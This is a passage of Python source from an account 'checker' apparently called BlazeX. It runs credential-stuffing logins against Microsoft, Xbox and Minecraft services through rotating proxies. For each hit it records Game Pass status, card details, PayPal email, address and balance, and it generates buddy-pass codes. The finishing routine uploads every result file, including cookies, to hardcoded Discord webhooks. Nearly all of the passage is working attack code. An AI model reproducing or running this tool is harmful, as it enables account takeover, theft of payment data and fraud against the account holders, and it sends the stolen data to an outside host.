            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
            json_data = json.loads(r.text)
            city = region = zipcode = card_type = cod = ""
            if isinstance(json_data, list):
                for item in json_data:
                    if 'city' in item: city = item['city']
                    if 'region' in item: region = item['region']
                    if 'postal_code' in item: zipcode = item['postal_code']
                    if 'cardType' in item: card_type = item['cardType']
                    if 'country' in item: cod = item['country']
            else:
                city = json_data.get('city', '')
                region = json_data.get('region', '')
                zipcode = json_data.get('postal_code', '')
                card_type = json_data.get('cardType', '')
                cod = json_data.get('country', '')
            user_address = f"[Address: {address1} City: {city} State: {address1} State: {region} Postalcode: {zipcode} Country: {cod}]"
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
            item1 = lr_parse(r.text, '"title":"', '"')
            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
            start_date = lr_parse(r.text, '"startDate":"', 'T')
            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            parts = []
            if item1 is not None: parts.append(f"Purchased Item: {item1}")
            if auto_renew is not None: parts.append(f"Auto Renew: {auto_renew}")
            if start_date is not None: parts.append(f"startDate: {start_date}")
            if next_renewal_date is not None: parts.append(f"Next Billing: {next_renewal_date}")
            if parts: subscription1 = f"[ {' | '.join(parts)} ]"
            else: subscription1 = None
            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
            parts2 = []
            if item_bought is not None: parts2.append(f"Purchased Item's: {item_bought}")
            if auto_renew2 is not None: parts2.append(f"Auto Renew: {auto_renew2}")
            if start_date2 is not None: parts2.append(f"startDate: {start_date2}")
            if recurring is not None: parts2.append(f"Recurring: {recurring}")
            if next_renewal_date2 is not None: parts2.append(f"Next Billing: {next_renewal_date2}")
            if parts: subscription2 = f"[{' | '.join(parts2)}]"
            else: subscription2 = None
            description = lr_parse(r.text, '"description":"', '"')
            product_typee = lr_parse(r.text, '"productType":"', '"')
            product_type_map = {"PASS": "XBOX GAME PASS", "GOLD": "XBOX GOLD"}
            product_type = product_type_map.get(product_typee, product_typee)
            quantity = lr_parse(r.text, 'quantity":', ',')
            currency = lr_parse(r.text, 'currency":"', '"')
            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
            if total_amount_value is not None: total_amount = total_amount_value + f" {currency}"
            else: total_amount = f"0 {currency}"
            parts3 = []
            if description is not None: parts3.append(f"Product: {description}")
            if product_type is not None: parts3.append(f"Product Type: {product_type}")
            if quantity is not None: parts3.append(f"Total Purchase: {quantity}")
            if total_amount is not None: parts3.append(f"Total Price: {total_amount}")
            if parts: subscription3 = f"[ {' | '.join(parts3)} ]"
            else: subscription3 = None
            payment = ''
            paymentprint = ''
            if date_registered:
                payment += f"\nDate Registered: {date_registered}"
                paymentprint += f" | Date Registered: {date_registered}"
            if fullname:
                payment += f"\nFullname: {fullname}"
                paymentprint += f" | Fullname: {fullname}"
            if user_address:
                payment += f"\nUser Address: {user_address}"
                paymentprint += f" | User Address: {user_address}"
            if paypal_email:
                payment += f"\nPaypal Email: {paypal_email}"
                paymentprint += f" | Paypal Email: {paypal_email}"
            if credit_card:
                payment += f"\nCC Info: {credit_card} ending in {last4} expires {expiry_month}/{expiry_year}"
                paymentprint += f" | CC Info: {credit_card} ending in {last4} expires {expiry_month}/{expiry_year}"
            if balance:
                payment += f"\nBalance: {balance}"
                paymentprint += f" | Balance: {balance}"
            if subscription1:
                payment += f"\n{subscription1}"
                paymentprint += f" | {subscription1}"
            if subscription2:
                payment += f"\n{subscription2}"
                paymentprint += f" | {subscription2}"
            if subscription3:
                payment += f"\n{subscription3}"
                paymentprint += f" | {subscription3}"
            payment += "\n============================\n"
            if screen == "'2'": print(Fore.LIGHTBLUE_EX + f"Payment: {email}:{password}" + paymentprint)
            with open(os.path.join(results_dir, "Payment.txt"), 'a', encoding='utf-8') as file: file.write(f"{email}:{password}" + payment)
            break
        except Exception as e:
            retries += 1
            session.proxies = getproxy()

def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    with open(os.path.join(results_dir, "Valid_Mail.txt"), 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX + f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'})
            if r.status_code == 200:
                try:
                    capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                    CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                    CAPTURE.handle(session)
                    break
                except: pass
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                continue
            else: break
        except:
            retries += 1
            session.proxies = getproxy()
            continue

def checkmc(session, email, password, token, xbox_token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    while True:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0: time.sleep(20)
                continue
            else: break
        except:
            retries += 1
            session.proxies = getproxy()
            if len(proxylist) == 0: time.sleep(20)
            continue
    if checkrq.status_code == 200:
        if 'product_game_pass_ultimate' in checkrq.text:
            xgpu += 1
            cpm += 1
            checked += 1
            codes = []
            if screen == "'2'": print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password}")
            with open(os.path.join(results_dir, "XboxGamePassUltimate.txt"), 'a') as f: f.write(f"{email}:{password}\n")
            try:
                while True:
                    try:
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                        break
                    except:
                        retries += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                js = xsts.json()
                uhss = js['DisplayClaims']['xui'][0]['uhs']
                xsts_token = js.get('Token')
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                    "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                    "Origin": "https://www.xbox.com",
                    "Priority": "u=1, i",
                    "Referer": "https://www.xbox.com/",
                    "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                    "X-Ms-Api-Version": "1.0"
                }
                while True:
                    try:
                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                        break
                    except:
                        retries += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                if 'offerid' in r.text.lower():
                    offers = r.json()["offers"]
                    current_time = datetime.now(timezone.utc)
                    valid_offer_ids = [offer["offerId"] for offer in offers
                                       if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                    with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                        for offer in valid_offer_ids:
                            f.write(f"{offer}\n")
                    for offer in offers: codes.append(offer['offerId'])
                    if len(offers) < 5:
                        while True:
                            try:
                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                if 'offerId' in r.text:
                                    offers = r.json()["offers"]
                                    current_time = datetime.now(timezone.utc)
                                    valid_offer_ids = [offer["offerId"] for offer in offers
                                                       if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                    with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                                        for offer in valid_offer_ids:
                                            f.write(f"{offer}\n")
                                    shouldContinue = False
                                    for offer in offers:
                                        if offer['offerId'] not in codes: shouldContinue = True
                                    for offer in offers: codes.append(offer['offerId'])
                                    if shouldContinue == False: break
                                else: break
                            except:
                                retries += 1
                                session.proxies = getproxy()
                                if len(proxylist) == 0: time.sleep(20)
                                continue
                else:
                    while True:
                        try:
                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                            if 'offerId' in r.text:
                                offers = r.json()["offers"]
                                current_time = datetime.now(timezone.utc)
                                valid_offer_ids = [offer["offerId"] for offer in offers
                                                   if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                                    for offer in valid_offer_ids:
                                        f.write(f"{offer}\n")
                                shouldContinue = False
                                for offer in offers:
                                    if offer['offerId'] not in codes: shouldContinue = True
                                for offer in offers: codes.append(offer['offerId'])
                                if shouldContinue == False: break
                            else: break
                        except:
                            retries += 1
                            session.proxies = getproxy()
                            if len(proxylist) == 0: time.sleep(20)
                            continue
            except: pass
            capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
            return True
        elif 'product_game_pass_pc' in checkrq.text:
            xgp += 1
            cpm += 1
            checked += 1
            codes = []
            if screen == "'2'": print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {email}:{password}")
            with open(os.path.join(results_dir, "XboxGamePass.txt"), 'a') as f: f.write(f"{email}:{password}\n")
            try:
                while True:
                    try:
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                        break
                    except:
                        retries += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                js = xsts.json()
                uhss = js['DisplayClaims']['xui'][0]['uhs']
                xsts_token = js.get('Token')
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                    "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                    "Origin": "https://www.xbox.com",
                    "Priority": "u=1, i",
                    "Referer": "https://www.xbox.com/",
                    "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                    "X-Ms-Api-Version": "1.0"
                }
                while True:
                    try:
                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                        break
                    except:
                        retries += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                if 'offerid' in r.text.lower():
                    offers = r.json()["offers"]
                    current_time = datetime.now(timezone.utc)
                    valid_offer_ids = [offer["offerId"] for offer in offers
                                       if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                    with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                        for offer in valid_offer_ids:
                            f.write(f"{offer}\n")
                    for offer in offers: codes.append(offer['offerId'])
                    if len(offers) < 5:
                        while True:
                            try:
                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                if 'offerId' in r.text:
                                    offers = r.json()["offers"]
                                    current_time = datetime.now(timezone.utc)
                                    valid_offer_ids = [offer["offerId"] for offer in offers
                                                       if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                    with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                                        for offer in valid_offer_ids:
                                            f.write(f"{offer}\n")
                                    shouldContinue = False
                                    for offer in offers:
                                        if offer['offerId'] not in codes: shouldContinue = True
                                    for offer in offers: codes.append(offer['offerId'])
                                    if shouldContinue == False: break
                                else: break
                            except:
                                retries += 1
                                session.proxies = getproxy()
                                if len(proxylist) == 0: time.sleep(20)
                                continue
                else:
                    while True:
                        try:
                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                            if 'offerId' in r.text:
                                offers = r.json()["offers"]
                                current_time = datetime.now(timezone.utc)
                                valid_offer_ids = [offer["offerId"] for offer in offers
                                                   if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                with open(os.path.join(results_dir, "Codes.txt"), 'a') as f:
                                    for offer in valid_offer_ids:
                                        f.write(f"{offer}\n")
                                shouldContinue = False
                                for offer in offers:
                                    if offer['offerId'] not in codes: shouldContinue = True
                                for offer in offers: codes.append(offer['offerId'])
                                if shouldContinue == False: break
                            else: break
                        except:
                            retries += 1
                            session.proxies = getproxy()
                            if len(proxylist) == 0: time.sleep(20)
                            continue
            except: pass
            capture_mc(token, session, email, password, "Xbox Game Pass")
            return True
        elif '"product_minecraft"' in checkrq.text:
            checked += 1
            cpm += 1
            with open(os.path.join(results_dir, "Normal.txt"), 'a') as f: f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, "Normal")
            return True
        else:
            others = []
            if 'product_minecraft_bedrock' in checkrq.text:
                others.append("Minecraft Bedrock")
            if 'product_legends' in checkrq.text:
                others.append("Minecraft Legends")
            if 'product_dungeons' in checkrq.text:
                others.append('Minecraft Dungeons')
            if others != []:
                other += 1
                cpm += 1
                checked += 1
                items = ', '.join(others)
                open(os.path.join(results_dir, "Other.txt"), 'a').write(f"{email}:{password} | {items}\n")
                if screen == "'2'": print(Fore.YELLOW + f"Other: {email}:{password} | {items}")
                return True
            else:
                return False
    else:
        return False

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) == 0: time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            continue

def authenticate(email, password, tries=0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token, xbox_token)
            except: pass
            if hit == False: validmail(email, password)
            if config.get('payment') is True: payment(session, email, password)
    except:
        if tries < maxretries:
            tries += 1
            retries += 1
            authenticate(email, password, tries)
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'": print(Fore.RED + f"Bad: {email}:{password}")
            with open(os.path.join(results_dir, "Bad.txt"), 'a') as f:
                f.write(f"{email}:{password}\n")
    finally:
        session.close()

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX + f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            Load()

def JOB():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX + "Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"BlazeX by HarshOGG| Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    thread = threading.Thread(target=logscreen)
    thread.daemon = True
    thread.start()

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(Fore.CYAN + logo)
    print(Fore.CYAN + f" [{checked}/{len(Combos)}] Checked")
    print(Fore.CYAN + f" [{hits}] Hits")
    print(Fore.CYAN + f" [{bad}] Bad")
    print(Fore.CYAN + f" [{sfa}] SFA")
    print(Fore.CYAN + f" [{mfa}] MFA")
    print(Fore.CYAN + f" [{twofa}] 2FA")
    print(Fore.CYAN + f" [{xgp}] Xbox Game Pass")
    print(Fore.CYAN + f" [{xgpu}] Xbox Game Pass Ultimate")
    print(Fore.CYAN + f" [{other}] Other")
    print(Fore.CYAN + f" [{vm}] Valid Mail")
    print(Fore.CYAN + f" [{retries}] Retries")
    print(Fore.CYAN + f" [{errors}] Errors")
    utils.set_title(f"BlazeX by HarshOGG| Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    thread = threading.Thread(target=cuiscreen)
    thread.daemon = True
    thread.start()

def hide_folder(path):
    if os.name == 'nt':  # Windows
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)

def finishedscreen():
    global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, results_dir, temp_dir

    file_webhooks = {
        "Hits.txt": "https://discord.com/api/webhooks/1390944578713944198/Ffxe2lTw4QABHRN0dWN6krZkP6r-3BoZjpPDh-mvo0ac8vIvaXZWldRICCSFLG-pdfcU",
        "SFA.txt": "https://discord.com/api/webhooks/1398537934705266688/dYYYO7P9AIXD8C5L6UOR7Wq_6wbUHB43wp6dA1mEmHdkoLppEfTD59Iu_mZinrNJvLOU",
        "MFA.txt": "https://discord.com/api/webhooks/1398538914649866373/ccYD3ctSjYGLcFATGk9Xv3w4nVEUdd4CSxEHr3p6R8IMKGuDcP-9M2uwWhUXZQu9zNx5",
        "Normal.txt": "https://discord.com/api/webhooks/1390944609424773130/FsF2dw1IouR9FqxsH8ZbAtu66prQ5F0aVXv3S43C57-eVJS2lXgjwE1x0Rzf-lPuR15t",
        "XboxGamePass.txt": "https://discord.com/api/webhooks/1390944611991552122/O9dqI3hLGNx7bj3uZzotibFSTu3KtMqP-GPXRX31KdvU_TeGOSZ3W0ntXtyTafW6ZLdO",
        "XboxGamePassUltimate.txt": "https://discord.com/api/webhooks/1390944614327914586/PdRRtgo3oQrF_3uF8YOC5V3SKHh2Y5_M_-96c4t5dLIQH1uQwJuJPqSWygLJhx6oxx6L",
        "Other.txt": "https://discord.com/api/webhooks/1390944616454291528/059yo-415DUPgFHAnAlbVkVJNFp2mFxaaPxkAJAkuelhol5s-cSen3477d_OvKqnn-l1",
        "Valid_Mail.txt": "https://discord.com/api/webhooks/1390944617763045506/_a_QCm-iXGdxhsdrrlA5Wy4ZKjeN6o-SJO3hq-ExIIqDGuKJ5qcItcjOKztXBxFS7XbK",
        "Banned.txt": "https://discord.com/api/webhooks/1390944618664955966/2T3cnci0K9HIVAtRZ3_MIMh-aVbNx5zQbXh06UsUu_VmtXyZVyGKRBh-kivfwqzY15sD",
        "Unbanned.txt": "https://discord.com/api/webhooks/1390944619105353758/ZN1FK9t95ta6wC8hLO_aKGBq2IJJjWnzoUJc8iigWSQbvL8cKO6scxfy-Xbr_bRb40G3",
        "rank.txt": "https://discord.com/api/webhooks/1390944619889561630/ZdnCQmdiF_xqTAgdrbJ5xKPXHtRAEG3MTU2uhbzrzWxQafeSEbJaf88YCUYTZUc_HiUn",
        "name_changable.txt": "https://discord.com/api/webhooks/1390944620468375615/fzbLfKQmccJsi4eEaTVHuhVrtPTcQaUxv-rXYWx8ywn6hrvgMprVMaT6XClwXbiDrwvQ",
        "capes.txt": "https://discord.com/api/webhooks/1390944621349179465/oR0eC3-AWlCBq47Ki7BFaiWPgMC5-yOqJ7dpYsd5WSwqDBGWX4oECnawwf2-LMpIyXEg",
        "Capture.txt": "https://discord.com/api/webhooks/1398539905860243478/WeYQrf-JTXcCYVjJKOwwEsx0Brn-OBqASJB8LWMJLmVbsfWhDuCYLUpSZeUN_dtBO6TY",
        "Payment.txt": "https://discord.com/api/webhooks/1398540023321727038/OkJJCVhSmvhX5jhLpDHqtXz75VcnXSzdkLswapUmWnEq6Rtpzwp-oJ2ng3tNnGTX3nWT",
        "Codes.txt": "https://discord.com/api/webhooks/1390947924115984525/fyE44VD5GFiwxyuQLf6lP6mTyhYfNiM8SQb6HYU4FpPey_8uzo7V4lDsKngK-zAG7Tcm",
    }

    folder_webhooks = {
        "Capes": "https://discord.com/api/webhooks/1398553856501350440/Se18hLbyV5Ib8VwjWIDvLoV-Raq11djtNWGNutmNazNmFotJACJy9MY6rNXN6do2b1i4",
        "Cookies": "https://discord.com/api/webhooks/1398553987661430855/XPZe32V0hSgHDOQQPSYUbsdez-zVzQar9LYwZ7CFwCdnoJ0CoWVgtYj3i9xKr48KNB-e"
    }

    completion_webhook = "https://discord.com/api/webhooks/1390949129336651837/glqNcQWW63qoDPqwX8FhjvxprQO1-zmfm2t7JA3-6xhetq_66GU3q1QVHQFRUQqO0C9n"
    default_file_webhook = "https://discord.com/api/webhooks/1390948682106671145/_x1tLmFeHaSKAaFHpSdoxQwbuzTv8ZheIMBsyCtwnRTowgpobYlUkoojaK38_JXPQIGt"

    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX + "Finished Checking!")
    print()
    print(f"Hits: {hits}")
    print(f"Bad: {bad}")
    print(f"SFA: {sfa}")
    print(f"MFA: {mfa}")
    print(f"2FA: {twofa}")
    print(f"Xbox Game Pass: {xgp}")
    print(f"Xbox Game Pass Ultimate: {xgpu}")
    print(f"Other: {other}")
    print(f"Valid Mail: {vm}")

    if default_file_webhook:
        counts = {}
        files_to_count = [
            "Hits.txt", "Bad.txt", "2fa.txt", "SFA.txt", "MFA.txt",
            "XboxGamePass.txt", "XboxGamePassUltimate.txt", "Other.txt",
            "Valid_Mail.txt", "Banned.txt", "Unbanned.txt", "rank.txt",
            "name_changable.txt"
        ]
        for file in files_to_count:
            try:
                with open(os.path.join(results_dir, file), 'r') as f:
                    counts[file] = len(f.readlines())
            except FileNotFoundError:
                counts[file] = 0

        capes_count = 0
        capes_folder = os.path.join(results_dir, "Capes")
        if os.path.exists(capes_folder):
            for file in os.listdir(capes_folder):
                if file.endswith(".txt"):
                    try:
                        with open(os.path.join(capes_folder, file), 'r') as f:
                            capes_count += len(f.readlines())
                    except:
                        pass

        embed_fields = [
            {"name": "🎯 Hits", "value": str(counts.get("Hits.txt", 0)), "inline": True},
            {"name": "❌ Bad", "value": str(counts.get("Bad.txt", 0)), "inline": True},
            {"name": "🔒 2FA", "value": str(counts.get("2fa.txt", 0)), "inline": True},
            {"name": "🔓 SFA", "value": str(counts.get("SFA.txt", 0)), "inline": True},
            {"name": "🔐 MFA", "value": str(counts.get("MFA.txt", 0)), "inline": True},
            {"name": "🎮 Xbox Game Pass", "value": str(counts.get("XboxGamePass.txt", 0)), "inline": True},
            {"name": "🏆 Xbox Game Pass Ultimate", "value": str(counts.get("XboxGamePassUltimate.txt", 0)), "inline": True},
            {"name": "🔄 Other", "value": str(counts.get("Other.txt", 0)), "inline": True},
            {"name": "📧 Valid Mail", "value": str(counts.get("Valid_Mail.txt", 0)), "inline": True},
            {"name": "⛔ Banned", "value": str(counts.get("Banned.txt", 0)), "inline": True},
            {"name": "✅ Unbanned", "value": str(counts.get("Unbanned.txt", 0)), "inline": True},
            {"name": "🏅 Ranked", "value": str(counts.get("rank.txt", 0)), "inline": True},
            {"name": "🔄 Name Changable", "value": str(counts.get("name_changable.txt", 0)), "inline": True},
            {"name": "🦸 Capes", "value": str(capes_count), "inline": True},
        ]
        payload = {
            "username": "🉑・ BlazeCloud - The Best Cloud!",
            "avatar_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&",
            "embeds": [
                {
                    "author": {
                        "name": "📈・ BlazeCloud Minecraft Checker Summary",
                        "url": "https://discord.gg/blazexcloud",
                        "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&"
                    },
                    "title": "Checker Results Summary",
                    "color": 3821605,
                    "fields": embed_fields,
                    "footer": {
                        "text": f"🪐・ Summary By .gg/blazecloud - Checked by {RESTOCKER_NAME}",
                        "icon_url": "https://cdn.discord.com/attachments/1347495402013855785/1365946274410401834/file_00000000f68051f8a40229b454cd5c1d_conversation_id67eff61d-d32c-8000-beef-73.webp?ex=68472fd9&is=6845de59&hm=c5abf6b47608d0e43880eb7fa84b3db8762a5b7b738befe11999d2fdc50ce655&"
                    }
                }
            ]
        }
        try:
            response = requests.post(default_file_webhook, json=payload, timeout=10)
        except Exception as e:
            pass

        for root, dirs, files in os.walk(results_dir):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    relative_path = os.path.relpath(root, results_dir)
                    if relative_path == ".":
                        message = f"File uploaded successfully 📤 checked by {RESTOCKER_NAME} - {file}"
                    else:
                        message = f"File uploaded successfully from {relative_path} 📤 checked by {RESTOCKER_NAME} - {file}"
                    try:
                        with open(file_path, 'rb') as f:
                            files_data = {'file': (file, f)}
                            payload = {"content": message}
                            response = requests.post(default_file_webhook, data=payload, files=files_data, timeout=30)
                    except Exception as e:
                        pass
